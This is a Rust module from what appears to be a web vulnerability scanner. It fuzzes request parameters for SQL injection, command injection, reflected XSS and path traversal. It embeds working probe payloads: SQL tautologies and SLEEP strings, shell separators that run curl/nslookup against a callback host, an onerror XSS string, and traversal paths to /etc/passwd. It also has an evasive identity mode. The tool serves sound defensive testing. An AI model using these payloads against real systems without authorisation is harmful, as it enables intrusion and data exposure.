//! Active-injection oracle: fuzz discovered request parameters for SQL injection,
//! reflected XSS, OS command injection, and local file inclusion / path traversal.
//!
//! Every candidate flows through GENERATE -> DETECT -> CONFIRM -> REPORT, the same
//! correctness discipline as the template and authz engines: a hit is re-issued
//! (and, for differential/timing classes, checked against a control) before it is
//! reported. All probes are read-only and non-destructive -- SQLi/cmdi confirmation
//! is by DB-error signature, boolean/response differential, a benign `SLEEP`, or an
//! out-of-band OAST callback; never a state-changing payload.
//!
//! An injection *site* is one fuzzable location: a URL query parameter, a form-body
//! field (application/x-www-form-urlencoded), or a JSON-body field. The request the
//! target actually expects (method + body shape) is learned by the caller (form
//! parsing / OpenAPI ingestion / JS analysis) and passed in per endpoint.

use crate::engine::{AuthSpec, OastSpec, read_body_capped};
use serde::Deserialize;
use serde_json::{Value, json};
use std::time::{Duration, Instant};
use tokio::sync::mpsc;
use transport::Client;

#[derive(Debug, Deserialize)]
pub struct InjectParams {
    #[serde(default)]
    pub endpoints: Vec<InjEndpoint>,
    #[serde(default = "d_timeout")]
    pub timeout_ms: u64,
    #[serde(default)]
    pub target: String,
    #[serde(default = "d_true")]
    pub evasive: bool,
    #[serde(default)]
    pub identify: Option<String>,
    #[serde(default)]
    pub auth: Option<AuthSpec>,
    #[serde(default)]
    pub oast: Option<OastSpec>,
    /// Which classes to run (sqli/xss/cmdi/lfi); empty = all.
    #[serde(default)]
    pub classes: Vec<String>,
}
fn d_timeout() -> u64 {
    12_000
}
fn d_true() -> bool {
    true
}
fn d_get() -> String {
    "GET".to_string()
}
fn d_form() -> String {
    "form".to_string()
}

#[derive(Debug, Deserialize, Clone)]
pub struct BodyField {
    pub name: String,
    #[serde(default)]
    pub value: String,
}

#[derive(Debug, Deserialize, Clone)]
pub struct InjEndpoint {
    #[serde(default = "d_get")]
    pub method: String,
    pub url: String,
    /// Query param names to fuzz. Empty = every query param present in `url`.
    #[serde(default)]
    pub params: Vec<String>,
    /// Body fields to fuzz (their baseline values keep the request well-formed).
    #[serde(default)]
    pub body: Vec<BodyField>,
    /// "form" (x-www-form-urlencoded) or "json".
    #[serde(default = "d_form")]
    pub body_type: String,
}

const SLEEP_SECS: u64 = 5;
const SLEEP_THRESHOLD_MS: u128 = 3800;
const MAX_ENDPOINTS: usize = 300;
const MAX_SITES_PER_EP: usize = 16;

struct Resp {
    status: u16,
    body: String,
    elapsed_ms: u128,
}

#[derive(Clone, Copy, PartialEq)]
enum Loc {
    Query,
    BodyForm,
    BodyJson,
    Path,
}

/// One fuzzable location on one endpoint.
struct Site {
    method: String,
    url: String, // full URL (query included)
    loc: Loc,
    param: String,               // the field/param being fuzzed (segment for Path)
    base_value: String,          // its baseline value (keeps the request valid)
    body: Vec<(String, String)>, // baseline body fields (for body sites)
    path_idx: usize,             // which path segment (Loc::Path only)
}

impl Site {
    /// Render (url, optional (body, content-type)) with `param` set to `value`.
    fn render(&self, value: &str) -> (String, Option<(String, &'static str)>) {
        match self.loc {
            Loc::Query => (set_param(&self.url, &self.param, value), None),
            Loc::Path => (set_path_seg(&self.url, self.path_idx, value), None),
            Loc::BodyForm => {
                let body = self
                    .body
                    .iter()
                    .map(|(k, v)| {
                        let vv = if k == &self.param { value } else { v.as_str() };
                        format!("{}={}", pct_encode(k), pct_encode(vv))
                    })
                    .collect::<Vec<_>>()
                    .join("&");
                (
                    self.url.clone(),
                    Some((body, "application/x-www-form-urlencoded")),
                )
            }
            Loc::BodyJson => {
                let mut obj = serde_json::Map::new();
                for (k, v) in &self.body {
                    let vv = if k == &self.param {
                        value.to_string()
                    } else {
                        v.clone()
                    };
                    obj.insert(k.clone(), Value::String(vv));
                }
                (
                    self.url.clone(),
                    Some((Value::Object(obj).to_string(), "application/json")),
                )
            }
        }
    }
    fn where_label(&self) -> String {
        match self.loc {
            Loc::Query => format!("query parameter `{}`", self.param),
            Loc::BodyForm | Loc::BodyJson => format!("body parameter `{}`", self.param),
            Loc::Path => format!("URL path segment `{}`", self.param),
        }
    }
}

pub async fn run(params: InjectParams, tx: mpsc::UnboundedSender<Value>) {
    let _ = tx.send(json!({"type":"ack","target": params.target}));
    if params.endpoints.is_empty() {
        let _ = tx.send(json!({"type":"error","message":"injection testing needs at least one endpoint (run a crawl first, or provide endpoints)"}));
        let _ = tx.send(json!({"type":"done","found":0}));
        return;
    }
    let want = |c: &str| params.classes.is_empty() || params.classes.iter().any(|x| x == c);

    let client = match build_client(&params) {
        Some(c) => c,
        None => {
            let _ = tx.send(json!({"type":"error","message":"client build failed"}));
            return;
        }
    };
    let oast = match &params.oast {
        Some(s) if !s.domains.is_empty() && !s.api_url.is_empty() => {
            crate::oast::OastClient::from_spec(s.domains.clone(), &s.api_url)
        }
        _ => crate::oast::OastClient::from_env(),
    };

    let mut found = 0i64;
    let mut done = 0i64;
    let total = params.endpoints.len().min(MAX_ENDPOINTS) as i64;

    for ep in params.endpoints.iter().take(MAX_ENDPOINTS) {
        for site in sites_for(ep) {
            let baseline = match send_site(&client, &site, &site.base_value).await {
                Some(r) => r,
                None => continue,
            };
            if want("sqli") {
                if let Some(f) = probe_sqli(&client, &site, &baseline).await {
                    let _ = tx.send(json!({"type":"finding","data":f}));
                    found += 1;
                    continue;
                }
            }
            if want("cmdi") {
                if let Some(f) = probe_cmdi(&client, &site, oast.as_ref()).await {
                    let _ = tx.send(json!({"type":"finding","data":f}));
                    found += 1;
                    continue;
                }
            }
            if want("xss") {
                if let Some(f) = probe_xss(&client, &site).await {
                    let _ = tx.send(json!({"type":"finding","data":f}));
                    found += 1;
                }
            }
            if want("lfi") {
                if let Some(f) = probe_lfi(&client, &site, &baseline).await {
                    let _ = tx.send(json!({"type":"finding","data":f}));
                    found += 1;
                }
            }
        }
        done += 1;
        if done % 3 == 0 || done == total {
            let _ = tx.send(json!({"type":"progress","processed":done,"total":total}));
        }
    }
    let _ = tx.send(json!({"type":"done","found":found}));
}

/// Expand an endpoint into its fuzzable sites (query params + body fields).
fn sites_for(ep: &InjEndpoint) -> Vec<Site> {
    let method = ep.method.to_uppercase();
    let mut out = Vec::new();
    let qnames: Vec<String> = if ep.params.is_empty() {
        query_param_names(&ep.url)
    } else {
        ep.params.clone()
    };
    for name in qnames {
        let base = current_value(&ep.url, &name).unwrap_or_else(|| "1".to_string());
        out.push(Site {
            method: method.clone(),
            url: ep.url.clone(),
            loc: Loc::Query,
            param: name,
            base_value: base,
            body: Vec::new(),
            path_idx: 0,
        });
    }
    // Id-like path segments (numeric / uuid / slug-with-digit) are fuzzed too:
    // REST APIs put the object key in the path (e.g. /users/v1/{id}), and an
    // OpenAPI `{param}` is filled with a numeric sample here, so this reaches
    // path-parameter SQLi/traversal that query+body fuzzing misses.
    let path = path_only(&ep.url);
    for (i, seg) in path.split('/').enumerate() {
        if looks_like_id_seg(seg) {
            out.push(Site {
                method: method.clone(),
                url: ep.url.clone(),
                loc: Loc::Path,
                param: seg.to_string(),
                base_value: seg.to_string(),
                body: Vec::new(),
                path_idx: i,
            });
        }
    }
    if !ep.body.is_empty() {
        let loc = if ep.body_type.eq_ignore_ascii_case("json") {
            Loc::BodyJson
        } else {
            Loc::BodyForm
        };
        let body: Vec<(String, String)> = ep
            .body
            .iter()
            .map(|f| {
                (
                    f.name.clone(),
                    if f.value.is_empty() {
                        "test".into()
                    } else {
                        f.value.clone()
                    },
                )
            })
            .collect();
        let bmethod = if method == "GET" {
            "POST".to_string()
        } else {
            method.clone()
        };
        for f in &ep.body {
            let base = body
                .iter()
                .find(|(k, _)| k == &f.name)
                .map(|(_, v)| v.clone())
                .unwrap_or_default();
            out.push(Site {
                method: bmethod.clone(),
                url: ep.url.clone(),
                loc,
                param: f.name.clone(),
                base_value: base,
                body: body.clone(),
                path_idx: 0,
            });
        }
    }
    out.truncate(MAX_SITES_PER_EP);
    out
}

fn looks_like_id_seg(seg: &str) -> bool {
    if seg.is_empty() {
        return false;
    }
    if seg.chars().all(|c| c.is_ascii_digit()) {
        return true; // numeric id
    }
    let dashes = seg.matches('-').count();
    if seg.len() >= 32 || (dashes >= 4 && seg.len() >= 30) {
        return true; // uuid / long token
    }
    seg.len() >= 4
        && seg.chars().any(|c| c.is_ascii_digit())
        && seg
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_')
}

fn path_only(url: &str) -> String {
    let after = url.split("://").nth(1).unwrap_or(url);
    let start = after.find('/').unwrap_or(after.len());
    after[start..]
        .split(['?', '#'])
        .next()
        .unwrap_or("")
        .to_string()
}

/// Rebuild `url` with path segment `idx` replaced by the percent-encoded `value`.
fn set_path_seg(url: &str, idx: usize, value: &str) -> String {
    let (scheme, rest) = match url.split_once("://") {
        Some((s, r)) => (format!("{s}://"), r),
        None => (String::new(), url),
    };
    let (authority, tail) = match rest.find('/') {
        Some(p) => (&rest[..p], &rest[p..]),
        None => (rest, ""),
    };
    let (path, suffix) = match tail.find(['?', '#']) {
        Some(p) => (&tail[..p], &tail[p..]),
        None => (tail, ""),
    };
    let mut segs: Vec<String> = path.split('/').map(|s| s.to_string()).collect();
    if idx < segs.len() {
        segs[idx] = pct_encode(value);
    }
    format!("{scheme}{authority}{}{suffix}", segs.join("/"))
}

async fn send_site(client: &Client, site: &Site, value: &str) -> Option<Resp> {
    let (url, body) = site.render(value);
    send(
        client,
        &site.method,
        &url,
        body.as_ref().map(|(b, c)| (b.as_str(), *c)),
    )
    .await
}

// ---------------------------------------------------------------- SQLi
async fn probe_sqli(client: &Client, site: &Site, baseline: &Resp) -> Option<Value> {
    // 1) error-based: an unbalanced quote yields a DB error the baseline lacks; a
    //    balanced-quote control must NOT error (else the app just always errors).
    let base = &site.base_value;
    if !is_sql_error(&baseline.body) {
        for q in ["'", "\""] {
            let broken = send_site(client, site, &format!("{base}{q}")).await;
            if let Some(r) = &broken {
                if is_sql_error(&r.body) {
                    let ctrl = send_site(client, site, &format!("{base}{q}{q}")).await;
                    let ctrl_clean = ctrl.map(|c| !is_sql_error(&c.body)).unwrap_or(false);
                    let again = send_site(client, site, &format!("{base}{q}")).await;
                    if ctrl_clean && again.map(|a| is_sql_error(&a.body)).unwrap_or(false) {
                        return Some(finding(
                            "sqli",
                            "SQL injection (error-based)",
                            "high",
                            site,
                            format!(
                                "Injecting a single unbalanced quote into the {} produced a database error, and a balanced quote did not -- the value reaches a SQL statement unparameterised.",
                                site.where_label()
                            ),
                        ));
                    }
                }
            }
        }
    }
    // 2) boolean-based
    let pairs = [
        ("' OR '1'='1", "' OR '1'='2"),
        (" OR 1=1-- -", " OR 1=2-- -"),
    ];
    for (t, f) in pairs {
        let rt = send_site(client, site, &format!("{base}{t}")).await;
        let rf = send_site(client, site, &format!("{base}{f}")).await;
        if let (Some(a), Some(b)) = (rt, rf) {
            if boolean_differential(baseline, &a, &b) {
                let rt2 = send_site(client, site, &format!("{base}{t}")).await;
                let rf2 = send_site(client, site, &format!("{base}{f}")).await;
                if let (Some(a2), Some(b2)) = (rt2, rf2) {
                    if boolean_differential(baseline, &a2, &b2) {
                        return Some(finding(
                            "sqli",
                            "SQL injection (boolean-based blind)",
                            "high",
                            site,
                            format!(
                                "A tautology and a contradiction injected into the {} produced consistently different result sets (true={} bytes, false={} bytes), indicating the value is evaluated inside a SQL query.",
                                site.where_label(),
                                a2.body.len(),
                                b2.body.len()
                            ),
                        ));
                    }
                }
            }
        }
    }
    // 3) time-based blind
    let payloads = [
        format!("' AND SLEEP({SLEEP_SECS})-- -"),
        format!("\" AND SLEEP({SLEEP_SECS})-- -"),
        format!("' AND SLEEP({SLEEP_SECS})#"),
        format!("');SELECT pg_sleep({SLEEP_SECS})-- -"),
        format!(" AND SLEEP({SLEEP_SECS})"),
    ];
    for p in payloads {
        let r = send_site(client, site, &format!("{base}{p}")).await;
        if r.as_ref()
            .map(|x| x.elapsed_ms >= SLEEP_THRESHOLD_MS)
            .unwrap_or(false)
        {
            let zero = p
                .replace(&format!("SLEEP({SLEEP_SECS})"), "SLEEP(0)")
                .replace(&format!("pg_sleep({SLEEP_SECS})"), "pg_sleep(0)");
            let rc = send_site(client, site, &format!("{base}{zero}")).await;
            let again = send_site(client, site, &format!("{base}{p}")).await;
            let ctrl_fast = rc
                .map(|x| x.elapsed_ms < SLEEP_THRESHOLD_MS)
                .unwrap_or(false);
            let repro = again
                .map(|x| x.elapsed_ms >= SLEEP_THRESHOLD_MS)
                .unwrap_or(false);
            if ctrl_fast && repro {
                return Some(finding(
                    "sqli",
                    "SQL injection (time-based blind)",
                    "high",
                    site,
                    format!(
                        "A `SLEEP({SLEEP_SECS})` injected into the {} delayed the response past {}ms while a `SLEEP(0)` control returned promptly and the delay reproduced.",
                        site.where_label(),
                        SLEEP_THRESHOLD_MS
                    ),
                ));
            }
        }
    }
    None
}

// ---------------------------------------------------------------- OS command injection
async fn probe_cmdi(
    client: &Client,
    site: &Site,
    oast: Option<&crate::oast::OastClient>,
) -> Option<Value> {
    let base = &site.base_value;
    if let Some(oc) = oast {
        if let Some(reg) = oc.register(client).await {
            let host = oc.host(&reg);
            for sep in [";", "|", "&&", "$(", "`"] {
                let close = if sep == "$(" {
                    ")"
                } else if sep == "`" {
                    "`"
                } else {
                    ""
                };
                let _ = send_site(
                    client,
                    site,
                    &format!("{base}{sep}curl http://{host}/c{close}"),
                )
                .await;
                let _ =
                    send_site(client, site, &format!("{base}{sep}nslookup {host}{close}")).await;
            }
            for _ in 0..4 {
                tokio::time::sleep(Duration::from_millis(700)).await;
                if oc.poll(client, &reg).await > 0 {
                    oc.deregister(client, &reg).await;
                    return Some(finding(
                        "cmdi",
                        "OS command injection (blind, OAST-confirmed)",
                        "critical",
                        site,
                        format!(
                            "A shell metacharacter + `curl`/`nslookup` injected into the {} produced an out-of-band callback -- the value is executed by a shell.",
                            site.where_label()
                        ),
                    ));
                }
            }
            oc.deregister(client, &reg).await;
        }
    }
    for sep in [";", "|", "&&", "$(", "`"] {
        let close = if sep == "$(" {
            ")"
        } else if sep == "`" {
            "`"
        } else {
            ""
        };
        let pl = format!("{base}{sep}sleep {SLEEP_SECS}{close}");
        let r = send_site(client, site, &pl).await;
        if r.as_ref()
            .map(|x| x.elapsed_ms >= SLEEP_THRESHOLD_MS)
            .unwrap_or(false)
        {
            let ctrl = send_site(client, site, &format!("{base}{sep}sleep 0{close}")).await;
            let again = send_site(client, site, &pl).await;
            let ctrl_fast = ctrl
                .map(|x| x.elapsed_ms < SLEEP_THRESHOLD_MS)
                .unwrap_or(false);
            let repro = again
                .map(|x| x.elapsed_ms >= SLEEP_THRESHOLD_MS)
                .unwrap_or(false);
            if ctrl_fast && repro {
                return Some(finding(
                    "cmdi",
                    "OS command injection (time-based blind)",
                    "critical",
                    site,
                    format!(
                        "A shell `sleep {SLEEP_SECS}` injected into the {} (separator `{sep}`) delayed the response past {}ms while `sleep 0` returned promptly and the delay reproduced.",
                        site.where_label(),
                        SLEEP_THRESHOLD_MS
                    ),
                ));
            }
        }
    }
    None
}

// ---------------------------------------------------------------- reflected XSS
async fn probe_xss(client: &Client, site: &Site) -> Option<Value> {
    let marker = format!("cfx{}z{}", site.url.len(), site.param.len());
    let plain = send_site(client, site, &marker).await?;
    if !plain.body.contains(&marker) {
        return None;
    }
    let payload = format!("{marker}\"'><img src=x onerror=alert({marker})>");
    let r = send_site(client, site, &payload).await?;
    let raw_break = format!("\"'><img src=x onerror=alert({marker})>");
    if r.body.contains(&raw_break) {
        let r2 = send_site(client, site, &payload).await?;
        if r2.body.contains(&raw_break) {
            return Some(finding(
                "xss",
                "Reflected cross-site scripting (XSS)",
                "high",
                site,
                format!(
                    "An `<img onerror>` payload injected into the {} was reflected into the response body without HTML-encoding, so injected markup executes in the victim's browser.",
                    site.where_label()
                ),
            ));
        }
    }
    None
}

// ---------------------------------------------------------------- LFI / traversal
async fn probe_lfi(client: &Client, site: &Site, baseline: &Resp) -> Option<Value> {
    if PASSWD_RE.is_match(&baseline.body) {
        return None;
    }
    let payloads = [
        "../../../../../../../../etc/passwd",
        "....//....//....//....//....//etc/passwd",
        "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
        "/etc/passwd",
        "..\\..\\..\\..\\..\\..\\windows\\win.ini",
    ];
    for p in payloads {
        let r = send_site(client, site, p).await?;
        let hit_unix = PASSWD_RE.is_match(&r.body);
        let hit_win = r.body.contains("[extensions]")
            || r.body.contains("[fonts]")
            || r.body.contains("for 16-bit app support");
        if hit_unix || hit_win {
            let again = send_site(client, site, p).await?;
            if PASSWD_RE.is_match(&again.body) || again.body.contains("[extensions]") {
                let what = if hit_unix {
                    "/etc/passwd"
                } else {
                    "windows/win.ini"
                };
                return Some(finding(
                    "lfi",
                    "Local file inclusion / path traversal",
                    "high",
                    site,
                    format!(
                        "A traversal payload in the {} returned the contents of `{what}` -- the parameter is used to build a file path without containment.",
                        site.where_label()
                    ),
                ));
            }
        }
    }
    None
}

// ---------------------------------------------------------------- helpers
async fn send(
    client: &Client,
    method: &str,
    url: &str,
    body: Option<(&str, &str)>,
) -> Option<Resp> {
    let mut rb = match method {
        "POST" => client.post(url),
        "PUT" => client.put(url),
        "DELETE" => client.delete(url),
        "PATCH" => client.patch(url),
        _ => client.get(url),
    };
    if let Some((b, ctype)) = body {
        rb = rb.header("content-type", ctype).body(b.to_string());
    }
    let t0 = Instant::now();
    match rb.send().await {
        Ok(r) => {
            let status = r.status().as_u16();
            let body = read_body_capped(r).await;
            Some(Resp {
                status,
                body,
                elapsed_ms: t0.elapsed().as_millis(),
            })
        }
        Err(_) => None,
    }
}

fn boolean_differential(baseline: &Resp, t: &Resp, f: &Resp) -> bool {
    if !(200..500).contains(&t.status) || !(200..500).contains(&f.status) {
        return false;
    }
    let (lt, lf) = (t.body.len() as i64, f.body.len() as i64);
    let diff = (lt - lf).abs();
    diff >= 16 && lt > lf && (lt - (baseline.body.len() as i64)).abs() <= diff
}

fn finding(class: &str, name: &str, severity: &str, site: &Site, detail: String) -> Value {
    json!({
        "type": "vulnerability",
        "vuln_class": class,
        "name": name,
        "severity": severity,
        "confidence": "confirmed",
        "target": site.url,
        "url": site.url,
        "method": site.method,
        "param": site.param,
        "location": match site.loc { Loc::Query => "query", Loc::Path => "path", _ => "body" },
        "description": detail,
        "source": "cortex-inject",
    })
}

fn build_client(params: &InjectParams) -> Option<Client> {
    let mode = adaptive::identity::Mode::from_flags(params.evasive, params.identify.clone());
    let seed = (!params.target.is_empty()).then_some(params.target.as_str());
    let browser = adaptive::identity::resolve(&mode, seed);
    transport::build_scan_client(transport::ScanClient {
        identity_headers: &browser.headers,
        user_agent: &browser.user_agent,
        auth: params.auth.as_ref(),
        attribution_token: None,
        emulate: !matches!(mode, adaptive::identity::Mode::Fast),
        timeout: Some(Duration::from_millis(
            params
                .timeout_ms
                .clamp(1000, 120_000)
                .max(SLEEP_SECS * 1000 + 3000),
        )),
        redirect: transport::Redirect::Limited(3),
        accept_invalid_certs: true,
        cookie_store: true,
        resolve: Vec::new(),
    })
    .ok()
}

fn query_param_names(url: &str) -> Vec<String> {
    let q = match url.split_once('?') {
        Some((_, q)) => q.split('#').next().unwrap_or(q),
        None => return Vec::new(),
    };
    let mut out = Vec::new();
    for pair in q.split('&').filter(|s| !s.is_empty()) {
        let k = pair.split_once('=').map(|(k, _)| k).unwrap_or(pair);
        if !k.is_empty() && !out.contains(&k.to_string()) {
            out.push(k.to_string());
        }
    }
    out
}

fn current_value(url: &str, param: &str) -> Option<String> {
    let q = url
        .split_once('?')
        .map(|(_, q)| q.split('#').next().unwrap_or(q))?;
    for pair in q.split('&') {
        if let Some((k, v)) = pair.split_once('=') {
            if k == param {
                return Some(pct_decode(v));
            }
        } else if pair == param {
            return Some(String::new());
        }
    }
    None
}

fn set_param(url: &str, param: &str, value: &str) -> String {
    let (base, frag) = match url.split_once('#') {
        Some((b, f)) => (b, Some(f)),
        None => (url, None),
    };
    let (path, query) = match base.split_once('?') {
        Some((p, q)) => (p, q),
        None => (base, ""),
    };
    let enc = pct_encode(value);
    let mut parts: Vec<String> = Vec::new();
    let mut replaced = false;
    for pair in query.split('&').filter(|s| !s.is_empty()) {
        let k = pair.split_once('=').map(|(k, _)| k).unwrap_or(pair);
        if k == param {
            parts.push(format!("{param}={enc}"));
            replaced = true;
        } else {
            parts.push(pair.to_string());
        }
    }
    if !replaced {
        parts.push(format!("{param}={enc}"));
    }
    let mut out = format!("{path}?{}", parts.join("&"));
    if let Some(f) = frag {
        out.push('#');
        out.push_str(f);
    }
    out
}

fn pct_encode(s: &str) -> String {
    let mut out = String::with_capacity(s.len() * 3);
    for b in s.bytes() {
        match b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                out.push(b as char)
            }
            _ => out.push_str(&format!("%{b:02X}")),
        }
    }
    out
}

fn pct_decode(s: &str) -> String {
    let bytes = s.as_bytes();
    let mut out = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'%' && i + 2 < bytes.len() {
            if let Ok(v) = u8::from_str_radix(&s[i + 1..i + 3], 16) {
                out.push(v);
                i += 3;
                continue;
            }
        }
        out.push(if bytes[i] == b'+' { b' ' } else { bytes[i] });
        i += 1;
    }
    String::from_utf8_lossy(&out).into_owned()
}

fn is_sql_error(body: &str) -> bool {
    SQL_ERR_RE.is_match(body)
}

use regex::Regex;
use std::sync::LazyLock;
static SQL_ERR_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?i)(SQL syntax.*MySQL|Warning.*\bmysqli?_|MySqlException|check the manual that corresponds to your (MySQL|MariaDB)|Unknown column '[^']+' in|PostgreSQL.*ERROR|pg_query\(\)|PSQLException|unterminated quoted string|Microsoft SQL Server|ODBC SQL Server Driver|Unclosed quotation mark after the character string|Incorrect syntax near|SQLServerException|\bORA-\d{5}\b|Oracle error|quoted string not properly terminated|SQLite/JDBCDriver|SQLite3?::|sqlite3?\.?(OperationalError|Exception)|SQLITE_ERROR|SQLite error|near "[^"]*": syntax error|unrecognized token|SQL logic error|java\.sql\.SQLException|syntax error at or near|You have an error in your SQL syntax)"#).unwrap()
});
static PASSWD_RE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"root:.*:0:0:").unwrap());
